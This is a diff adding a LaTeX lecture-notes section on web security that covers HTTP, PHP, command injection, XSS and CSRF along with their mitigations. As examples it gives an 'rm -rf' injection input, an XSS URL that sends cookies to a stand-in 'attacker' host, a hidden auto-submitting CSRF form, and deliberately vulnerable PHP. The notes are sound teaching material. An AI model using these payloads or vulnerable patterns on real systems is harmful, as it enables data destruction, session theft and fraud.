@@ -1,0 +1,379 @@
+\section{Web Security}
+This section will focus on the top layers of internet, recall from CS-202 (Computer System) that the internet is split into layers with the Physical layer, Network Layer, Transport layer,  and the Application layer. In this section we will focus on the Application layer that is HTTP 
+
+\subsection{HTTP/1.1: HyperText Transfer Protocol}
+HTTP is a Protocol that determines what actions Web servers and browsers should take in response to various commands. HTTP is a \important{request-response} protocol. For example
+
+\begin{enumerate}
+    \item The client sends the \important{Request} (e.g., for an HTML file, to update a database, send a mail)
+    \item The server processes the request, performs the requested action, and sends a \important{response} to the client.
+\end{enumerate}
+\begin{center}
+    HTTP is stateless: each command is executed independently, i.e., without any knowledge of any previous commands
+\end{center}
+There are two types of requests in HTTP, depending on how this information is sent :
+\begin{parag}{Cookies}
+    Cookies are a small piece of data stored by a browser on a user's device. The main goal is to store some kind of state information (such as shopping cart details) to create a HTTP '\textit{sessions}'. It also servers in order to track users
+	\begin{subparag}{Ambient authority in cookies}
+	    Assume that you are logged into \texttt{bank.com}, you therefore have cookies stored for \texttt{bank.com}. Any new HTTP requests to \texttt{bank.com} will \important{include all cookies for \texttt{bank.com}} so that you can continue your session (e.g., if you have a session cookie after login, you won't have to log in again for every request)
+	\end{subparag}
+\end{parag}
+
+\begin{parag}{HTTP Request}
+    Here let us first explain what a URL is, URL stands for \important{Uniform Resource Locator}, it is a standard way of referencing a resource (some text, a webpage, a script, an image, etc.). It includes the protocol used to acces the ressource, the host machine (typically as a domain, but can also be an IP and a port), and the relative address of the resource inside that host which may include a directory or not. Let us take for example the following URL
+	\begin{center}
+		\texttt{http://www.mywebsite.com/apparel/skirt.php}
+	\end{center}
+	Here the URL use \important{HTTP} to connect to the host \texttt{www.mywebsite.com} and find the page \texttt{skirt.php} inside the directory \texttt{apparel}.
+\end{parag}
+\begin{parag}{GET Request}
+	The \texttt{GET} method is used to request existing resource from the server. In a \texttt{GET} request method the parameters of a request are encoded in the URL. It is appended to the URL as a Key/Value Pair (Query string)
+	\begin{center}
+		\texttt{http://www.mywebsite.com/apparel/skirt.php?sku=123\&lang=en\&sect=silk}
+	\end{center}
+	In this case the \texttt{GET} method is passing 3 parameters to the host:
+	\begin{itemize}
+		\item \texttt{sku} with value 123
+		\item \texttt{lang} with value en
+		\item \texttt{sect} with value silk
+	\end{itemize}
+	The paramters appear after the mark \texttt{?} and are separated by the separator \texttt{\&}
+	
+\end{parag}
+
+\begin{parag}{POST Request}
+    the \texttt{POST} method is used to create or update a resource in the server. The data sent to the server is tored in the request body of the HTTP request. This may be JSON, XML, or other format.
+	\begin{center}
+	    	\texttt{POST /test/demo\_form.php HTTP/1.1}\\
+			\texttt{Host: w3schools.com}\\
+			\texttt{name1=value1\&name2=value2}
+	\end{center}
+	As opposed to \texttt{GET} request which \textbf{should not} change any data,  a \texttt{POST} request is typically used to modifies data on the Web server
+	
+\end{parag}
+\begin{framedremark}
+There are more HTTP methods, but those are not relevant for this section
+\end{framedremark}
+
+\begin{parag}{Typical operation}
+    So a typically way of how HTTP protocol work would be the following
+	\begin{itemize}
+	    \item We send \texttt{HTTP} requests, to describe what we want to see from the server (\texttt{GET} method)
+	    \item When we want to communicate '\textit{updates}' what is on the server (\texttt{POST} method)
+	    \item Wrapped into the \texttt{HTTP} responses, we often get an \texttt{HTML} response (data + the way it should be displayed)
+	    \item (In practice nothing enforces that \texttt{GET} requests do not modify the state of the server)
+	    \item standard methodologies for designing HTTP APIs, are for instance \texttt{REST}
+	\end{itemize}
+	
+\end{parag}
+
+
+\subsection{HTML: HyperText Markup Language}
+HTML is a \important{markup language} used to tell the browser how to render a document. Markup means that the different parts of the document are marked with \important{tags}, these tags help the browser know how to interpret each of the elements in the document. Let us take for example the following page
+\begin{lstlisting}[language=HTML]
+<!DOCTYPE html>
+<html>
+<head>
+<title>Page Title</title>
+</head>
+<body>
+<h1>My First Heading</h1>
+<p>My first paragraph.</p>
+</body>
+</html>
+\end{lstlisting}
+Here we have
+\begin{itemize}
+    \item \texttt{<!DOCTYPE html>} indicates the type of the document
+    \item \texttt{<html>} \dots \texttt{</html>} is the start and the end of the HTML document
+    \item \texttt{<head>} \dots \texttt{</head>} is the header, it contains the \textit{metadata} of the page. For example \texttt{<title>} is the title of the page which appears at the top of the browser (in the tab)
+    \item \texttt{<body>} \dots \texttt{</body>} is the body, it contains the actual \textit{content} of the page
+    \item \texttt{<h1>} is a heading (predefined size of font) and \texttt{<p>} is a paragraph, the basic unit of text
+\end{itemize}
+
+\subsection{PHP: PHP Hypertext Preprocessor}
+PHP is a \important{server scripting language}, that used to be very popular for making interactive Web pages (it is still powering popular content management software like WordPress and Drupal). The idea is that PHP uses inputs and variables to create web pages \textit{on the fly}, i.e., the HTML is not stored on the server but generated for each request.
+
+\begin{parag}{Variables}
+    Variables in PHP start with a \texttt{\$}, e.g., \texttt{\$myvariable}. There are some \important{special variables} that are used to read the values sent by the client:
+    \begin{itemize}
+        \item \texttt{\$\_GET[param]} returns the value associated to \texttt{param} in the URL (the query string)
+        \item \texttt{\$\_POST[param]} returns the value associated to \texttt{param} in the body of the request
+        \item \texttt{\$\_SESSION[param]} returns the value associated to \texttt{param} in the session (the one governed by the session cookie)
+    \end{itemize}
+    The command \texttt{echo} is used to output HTML code, which is what is then sent back in the HTTP response.
+\end{parag}
+
+\begin{parag}{Example}
+    Let us take the following PHP code running on the server
+    \begin{lstlisting}[language=PHP]
+<?php
+$var = "class";
+echo "<h2>PHP is Fun!</h2>";
+echo "Hello $var!<br>";
+echo "Learning PHP<br>";
+?>
+    \end{lstlisting}
+    This produces the following HTML code, which is the one sent as the HTTP response (the browser never sees the PHP code, only its result)
+    \begin{lstlisting}[language=HTML]
+<h2>PHP is Fun!</h2>
+Hello class!<br>
+Learning PHP<br>
+    \end{lstlisting}
+    Notice that \texttt{\$var} was replaced by its value inside the string.
+\end{parag}
+
+\begin{parag}{Lifetime of a GET request backed by a PHP server}
+    So the overall lifetime of a \texttt{GET} request would be the following
+    \begin{enumerate}
+        \item The \important{browser} sends the HTTP \texttt{GET} request, with the path (e.g., \texttt{/index.php}) and some headers (like \texttt{User-Agent}, \texttt{Accept})
+        \item The \important{web server} (Apache/Nginx) receives the request, sees the \texttt{.php} extension and understands that it is not a static file (like \texttt{.html} or \texttt{.jpg}). It therefore passes the request and its data to the PHP interpreter
+        \item The \important{PHP interpreter} executes \texttt{index.php} command by command. It fetches data (from the request, a database, etc.), processes it, performs calculations, checks user sessions, etc. In the end, PHP dynamically builds an HTML document as a string
+        \item Once the script finishes, PHP sends the complete generated HTML back to the web server, which sends it to the client's browser
+    \end{enumerate}
+\end{parag}
+
+\begin{parag}{Lifetime of a POST request backed by a PHP server}
+    The \texttt{POST} request is very similar
+    \begin{enumerate}
+        \item The \important{browser} sends the HTTP \texttt{POST} request. The \textit{body} contains the form data, usually as key/value pairs (e.g., \texttt{username=test\&pass=1234}) and the \textit{headers} include the method (\texttt{POST}), the path (e.g., \texttt{/login.php}), \dots
+        \item The \important{web server} receives the request and its payload, sees the \texttt{.php} extension and passes the \textbf{entire} request (headers and body) to the PHP interpreter
+        \item The \important{PHP interpreter} automatically parses the request body and populates the \texttt{\$\_POST} array. It then runs \texttt{login.php}, which can now access the data (e.g., \texttt{\$\_POST['username']}). It may then perform a write/update operation on a database, which is the main goal of a \texttt{POST}
+        \item After the action, the script prepares a response, either a simple response (e.g., \texttt{200 OK} with a "\textit{Success!}" message) or a redirect
+    \end{enumerate}
+    \begin{subparag}{Post/Redirect/Get}
+        A common pattern is for the script to answer the \texttt{POST} with a \important{redirect header} (e.g., \texttt{header('Location: /dashboard.php');}), which tells the browser to go to a new page with a \texttt{GET}. This prevents duplicate form submissions if the user hits "\textit{refresh}".
+    \end{subparag}
+\end{parag}
+
+\subsection{Reasoning about attacks: Common Weakness Enumeration (CWE)}
+With the STRIDE methodology, the idea was to reason about what the adversary can do. Another way of decreasing the attack surface is simply to \important{not repeat known errors}. This is the idea of the \important{Common Weakness Enumeration (CWE)}: a database maintained by MITRE of software errors leading to vulnerabilities, to help security engineers avoid common pitfalls ("\textit{what not to do}"). At a high level, these errors lead the software to not follow one of the security principles, and can be used by an adversary to compromise the system.
+
+\begin{parag}{CWE/SANS Top 25}
+    The CWE/SANS Top 25 Most Dangerous Software Errors (classification of 2011, the current one is at \texttt{https://cwe.mitre.org/top25}) splits the errors into three classes:
+    \begin{enumerate}
+        \item \important{Insecure Interaction Between Components}: one subsystem feeds another subsystem data that is not sanitized
+        \item \important{Risky Resource Management}: the system acts on inputs that are not sanitized
+        \item \important{Porous Defenses}: defenses fail to provide full protection or complete mediation, through missing checks or partial mechanisms
+    \end{enumerate}
+\end{parag}
+
+\subsubsection{CWE I: Insecure Interaction Between Components}
+This first class is defined as "\textit{insecure ways in which data is sent and received between separate components, modules, programs, processes, threads, or systems}". The programmer does not check the information that is sent between the different components of the system, and this non-sanitized information is then used by the program, resulting in unintended behaviors that the adversary can use to break security.
+
+\begin{parag}{CWE-78: OS Command Injection}
+    Also called "\textit{Improper Neutralization of Special Elements used in an OS Command}". Here the weakness is using a string received from an input that may be controlled by the adversary inside a command to the operating system.
+
+    Let us take for example a program whose objective is to show to the user the content of the folder named after them under \texttt{/home}. We provide the user with a web form with a single field, which is sent to the server in a variable \texttt{userName} using the \texttt{POST} method
+    \begin{lstlisting}[language=HTML]
+<form action="/url/myscript.php" method="post">
+userName: <input name="userName" type="text" />
+<input name="submit" type="submit" value="Submit">
+</form>
+    \end{lstlisting}
+    On the server, the script pastes the username at the end of the Linux command \texttt{ls -l /home/} and runs it
+    \begin{lstlisting}[language=PHP]
+$userName = $_POST["userName"];
+$command = 'ls -l /home/' . $userName;
+system($command);
+    \end{lstlisting}
+    (In PHP \texttt{.} is the string concatenation). So if the username is \texttt{ctroncoso}, the command executed is \texttt{ls -l /home/ctroncoso}. If the user exists we get the list of files, if not we get an error. So far so good.
+    \begin{subparag}{The attack}
+        There is \important{no check on the format of \texttt{\$userName}}! What happens if \texttt{\$userName = '; rm -rf'}? For Linux, the \texttt{;} marks the end of a command and the start of a new one. So the OS would execute both commands one after the other: first \texttt{ls -l /home/} which lists the home directory, and then \texttt{rm -rf /home/}, which recursively (\texttt{-r}) deletes everything under \texttt{/home} without asking (\texttt{-f})!
+    \end{subparag}
+\end{parag}
+
+\begin{parag}{CWE-79: Cross-site Scripting (XSS)}
+    Also called "\textit{Improper Neutralization of Input During Web Page Generation}". This is the same weakness in spirit, but here the adversarial input is not used to run a command, it is used to \important{dynamically generate web content}.
+
+    Let us take the same form, but now using the \texttt{GET} method (so the parameter is in the URL after the \texttt{?}). The server uses the input to personalize the page with a warm welcome (e.g., "\textit{Welcome Rick}" if the input is \texttt{Rick})
+    \begin{lstlisting}[language=PHP]
+$username = $_GET['userName'];
+echo '<div class="header"> Welcome, ' . $username . '</div>';
+    \end{lstlisting}
+    Again, there is \important{no check on the format of \texttt{\$username}}. What happens if I browse the page as
+    \begin{center}
+        \texttt{http://trustedSite.com/welcome.php?userName=<script>alert("You've been attacked!");</script>}
+    \end{center}
+    The HTML tags are included as is in the page. When the browser renders the page and finds the tag \texttt{<script></script>}, it interprets the content as JavaScript code and executes it: a popup opens saying "\textit{You've been attacked!}".
+    \begin{subparag}{Stealing cookies}
+        An alert is rather innocuous (it could already be more dangerous if the popup asked the user for their password and sent it to the attacker). But now consider
+        \begin{center}
+            \texttt{http://trustedSite.com/welcome.php?userName=<script>location="http://attacker/submit?cookie=" + document.cookie;</script>}
+        \end{center}
+        Here the script makes the browser go to the attacker's server, with as parameter \texttt{document.cookie}, i.e., \important{the user's cookies at \texttt{trustedSite.com}}. These cookies may contain sensitive information (login, personalization parameters) or security-relevant information, e.g., the session cookie used to resume a session without asking for the login and password again. With it, the attacker can log in as the victim.
+    \end{subparag}
+    \begin{subparag}{How XSS is used to attack a victim}
+        So a typical XSS attack would go as follows
+        \begin{enumerate}
+            \item The adversary exploits an XSS vulnerability to introduce a malicious script on a website (e.g., a script that sends the cookie to \texttt{http://attacker})
+            \item The victim requests the web page with the malicious code injected
+            \item The page is served, and the malicious script is downloaded to the victim's machine
+            \item The victim's browser interprets and executes the script, sending the user's cookie for that website to the attacker
+        \end{enumerate}
+        Note that from the point of view of the browser, the script comes from \texttt{trustedSite.com}, so it has access to everything belonging to \texttt{trustedSite.com}.
+    \end{subparag}
+\end{parag}
+
+\begin{parag}{How to avoid injection-based attacks?}
+    The rule is simple
+    \begin{center}
+        \important{Never send/execute anything that comes from an untrusted source without sanitization!}
+    \end{center}
+    Sanitization, sanitization, sanitization, and a little bit of sanitization. Remember Biba (already in the 70s!): never bring information from low (unknown) into high (OS, server).
+    \begin{subparag}{Why are those attacks so pervasive then?}
+        Even though the principle is simple, it is very hard to implement in practice because \important{cross-subsystem sanitization is hard}: sub-system A needs to know what the valid set of inputs for sub-system B is (the "\textit{universe of good things}" for B). Without this information, A cannot make sure that what it sends cannot be crafted to create harm.
+    \end{subparag}
+\end{parag}
+
+\begin{parag}{CWE-352: Cross-site Request Forgery (CSRF)}
+    Here the idea is to use hidden parameters in a form on website A to \important{forge a request} to website B, abusing the credentials (cookies) of the victim that authorize the execution of commands on B's server.
+
+    Let us take for example a (hypothetical!) form on the EPFL HR website to pay a student a given amount. The form has three inputs, which are sent with \texttt{POST} to \texttt{payStudent.php}
+    \begin{lstlisting}[language=HTML]
+<form action="/url/payStudent.php" method="post">
+Firstname: <input type="text" name="firstname"/><br/>
+Lastname: <input type="text" name="lastname"/><br/>
+Amount: <input type="text" name="amount">
+<input type="submit" name="submit" value="Pay">
+</form>
+    \end{lstlisting}
+    And the script \texttt{payStudent.php} works as follows
+    \begin{lstlisting}[language=PHP]
+<?php
+session_start();
+if (! session_is_registered("username")) {
+  echo "invalid session detected!";
+  // Redirect user to login page ...
+  exit;}
+$originAccount = findAccount($_SESSION['username']);
+$destinationAccount = findAccount($_POST['firstname'], $_POST['lastname']);
+send_money($originAccount, $destinationAccount, $_POST['amount']);
+echo "Your transfer has been successful.";
+?>
+    \end{lstlisting}
+    So
+    \begin{itemize}
+        \item First it checks whether the request comes with a \important{session cookie} indicating that the user has been authenticated. If not, it returns "\textit{invalid session detected}"
+        \item Once the session is validated, it takes as \important{origin account} the user whose login is in the cookie (\texttt{\$\_SESSION}), and as \important{destination account} the one given by the form (\texttt{\$\_POST})
+        \item It sends the amount indicated in the form and returns "\textit{Your transfer has been successful}"
+    \end{itemize}
+    \begin{subparag}{The attack}
+        A Malicious Student makes a web page with lots of Minions and Rick \& Morty images, containing the following code
+        \begin{lstlisting}[language=HTML]
+<script>
+function SendAttack () { form.submit(); }
+</script>
+<body onload="javascript:SendAttack();">
+<form action="http://epflHR.ch/paystudent.php" id="form" method="post">
+<input type="hidden" name="firstname" value="Malicious">
+<input type="hidden" name="lastname" value="Student">
+<input type="hidden" name="amount" value="1000 CHF">
+<img src="https://i.redd.it/388eovi0ebqz.jpg">
+</form>
+        \end{lstlisting}
+        The adversary copied the form from the original website, but
+        \begin{itemize}
+            \item the inputs are \important{hidden}: they exist and will be submitted, but they are not visible on the page (the only visible thing is the image)
+            \item the inputs have \important{hardcoded values}: his first name, last name and the amount to transfer to him
+            \item since the form is invisible, the user cannot click a button, so the form is submitted by the JavaScript function \texttt{SendAttack()}, which is triggered as soon as the page loads (\texttt{onload} attribute of \texttt{<body>})
+        \end{itemize}
+        Now, when a victim visits the Malicious Student's page \textbf{while being logged in} to EPFL HR, her browser has a session cookie for \texttt{epflHR.ch}. Recall ambient authority: the forged request to \texttt{epflHR.ch} will include \important{all cookies for \texttt{epflHR.ch}}. So
+        \begin{itemize}
+            \item the session check passes, because there is indeed a valid cookie
+            \item the origin account is the victim's, since that is the username in the session
+            \item the destination account is Malicious Student's, since the \texttt{\$\_POST} values are the ones hardcoded in the hidden form
+        \end{itemize}
+        And the Malicious Student successfully transfers 1000 CHF from the victim's account to his.
+    \end{subparag}
+    \begin{subparag}{Confused deputy}
+        Have we seen this before in the course? Using another program to execute a function with higher privileges\dots{} This is an instance of the \important{confused deputy problem}! The victim's (HR accredited) web client is confused into performing an action that seems to be authorized by the victim, but that in fact grants the victim's privileges to the Malicious Student. And this is enabled by the use of \important{ambient authority}: a cookie storing login information has in practice the same effect as being logged in on Linux, everything executed "\textit{under}" this cookie runs with the privileges of the authenticated user.
+    \end{subparag}
+\end{parag}
+
+\begin{framedremark}
+    \texttt{session\_is\_registered} is the function used in the slides, but it has been deprecated and removed from PHP (since 5.4), nowadays one would write \texttt{isset(\$\_SESSION['username'])}. It does not change anything to the attack.
+\end{framedremark}
+
+\begin{parag}{Same Origin Policy (SOP)}
+    The Same Origin Policy is a web browser security mechanism, enabled by default, that \important{restricts scripts of one origin from accessing data of another origin}. More precisely, it aims to
+    \begin{enumerate}
+        \item prevent scripts on origin A from \textbf{reading} data from origin B
+        \item prevent sites on origin A from sending to origin B anything that is not a "\textit{simple}" request. Simple requests are limited to \texttt{GET} and \texttt{POST}, with only a few headers that can be modified
+    \end{enumerate}
+    An \important{origin} is the triplet (\textit{protocol}, \textit{host}, \textit{port}), e.g., \texttt{https://example.com:8000}. Let us take some examples
+    \begin{itemize}
+        \item \texttt{https://example.com/a} $\to$ \texttt{https://example.com/b}: same origin (only the path changes)
+        \item \texttt{https://example.com/a} $\to$ \texttt{http://example.com/a}: not the same origin (protocol mismatch)
+        \item \texttt{https://example.com/a} $\to$ \texttt{https://www.example.com/a}: not the same origin (host mismatch)
+        \item \texttt{https://example.com/a} $\to$ \texttt{https://example.com:5000/a}: not the same origin (port mismatch)
+    \end{itemize}
+    Fine-grained policies, e.g., exceptions to the SOP allowed by another origin, are controlled by \important{CORS} policies (a special HTTP header).
+    \begin{subparag}{Does SOP prevent CSRF?}
+        \important{No!} In a CSRF the attacker does not need to \textit{read} anything from the HR site, he just needs to \textit{send} a request, and a form \texttt{POST} is precisely a "\textit{simple}" request that the SOP allows. The steps are
+        \begin{enumerate}
+            \item The victim logs into the HR site
+            \item The victim's session cookies for the HR site are stored in the browser
+            \item The victim visits the malicious site, which sends a \texttt{POST} request with the malicious student's data \textbf{and} the victim's stored HR cookies
+            \item The presence of the session cookies indicates to the HR server that the request is valid and can be processed
+        \end{enumerate}
+        So we need to check the origin of the request before executing it.
+    \end{subparag}
+\end{parag}
+
+\begin{parag}{How to avoid CSRF?}
+    There are several mitigations
+    \begin{itemize}
+        \item \important{Check the \texttt{Referer} or \texttt{Origin} header} of the request before executing it. The \texttt{Referer} contains the last page visited by the user, and \texttt{Origin} the host and port that caused the request. This is widely deployed but not always reliable, as browsers might strip these fields
+        \item \important{Make the maximum number of requests side-effect free}, to limit the attack surface: if a request cannot change values on the server, a CSRF using it has no impact. E.g., make sure \texttt{GET} requests do not modify anything
+        \item \important{Include an authenticator that the adversary cannot guess} (anti-CSRF token): like in many protocols against replay attacks, the server includes a fresh challenge in the page it serves, and only accepts requests that contain it. The attacker's page cannot know this value
+        \item \important{Request re-authentication for every action}: this definitely avoids the attack since there is no ambient authority anymore, but it causes big usability problems
+        \item \important{SameSite cookie attribute}: the most effective and modern solution, since it is implemented at the browser level. You add an attribute to the session cookie that tells the browser when it should be sent: \texttt{Strict}, \texttt{Lax} or \texttt{None}. It effectively solves a lot of CSRF cases in modern browsers (default in Chrome since around 2020), but not all of them, e.g., not if a \texttt{GET} request modifies the state of the server
+    \end{itemize}
+    \begin{subparag}{Why is all this so hard?}
+        Because HTTP is stateless, web developers need to re-define a session for each application. For a long time there was no standard way of establishing and managing sessions, so errors are common.
+    \end{subparag}
+\end{parag}
+
+\begin{framedremark}
+    The HTTP header is actually spelled \texttt{Referer} (with a single r), a typo that ended up in the original specification and stayed there.
+\end{framedremark}
+
+\subsubsection{CWE II: Risky Resource Management}
+This second class is defined as "\textit{ways in which software does not properly manage the creation, usage, transfer, or destruction of important system resources}". This time the programmer does not check the resources the program creates and manages, the system acts on inputs that are not sanitized. This can come in different flavors
+
+\begin{parag}{Buffer overflow family}
+    The programmer mis-estimates the space reserved in memory, and the program overwrites memory, code or other important variables, enabling the adversary to execute arbitrary code
+    \begin{itemize}
+        \item CWE-120: Buffer Copy without Checking Size of Input ("\textit{Classic Buffer Overflow}")
+        \item CWE-676: Use of Potentially Dangerous Function
+        \item CWE-131: Incorrect Calculation of Buffer Size
+        \item CWE-190: Integer Overflow or Wraparound
+    \end{itemize}
+\end{parag}
+
+\begin{parag}{Other insufficient sanitization}
+    Similar to the previous cases, recently created resources are fed with unsanitized input
+    \begin{itemize}
+        \item CWE-22: Improper Limitation of a Pathname to a Restricted Directory ("\textit{Path Traversal}")
+        \item CWE-134: Uncontrolled Format String
+    \end{itemize}
+\end{parag}
+
+\begin{framedremark}
+    We will see more about these first two families in the next lecture.
+\end{framedremark}
+
+\begin{parag}{TCB under the control of the adversary}
+    Here code (full programs, or pieces of it) that comes from untrusted sources is directly executed
+    \begin{itemize}
+        \item \important{CWE-494: Download of Code Without Integrity Check}. Never include in your TCB code components that you have not positively verified, at least verify the origin through a signature! This happens in particular with \important{updates}: if the update process is not correctly configured, one may include tampered software into critical parts of the system, making it vulnerable to any attack. For example CVE-2008-3438: Apple Mac OS X did not properly verify the authenticity of updates
+        \item \important{CWE-829: Inclusion of Functionality from Untrusted Control Sphere}. A dynamic include under the control of the adversary, e.g., including on a web page JavaScript that comes from an untrusted source (advertisers, gadgets embedded in the page, \dots). This is why frames are used to isolate (not perfectly) parts of a web page from each other
+    \end{itemize}
+    \begin{center}
+        Once in the TCB, any property can be violated!
+    \end{center}
+\end{parag}
+
+\subsubsection{CWE III: Porous Defenses}
+This third class is defined as "\textit{defensive techniques that are often misused, abused, or just plain ignored}". Here the principle of \important{complete mediation} is not respected, either because some checks are missing, or because the mechanisms only cover part of the security functionality. These errors include badly implementing the security mechanisms we saw in the first weeks of the course: errors in authentication procedures, badly assigned permissions, improper use of encryption, etc.
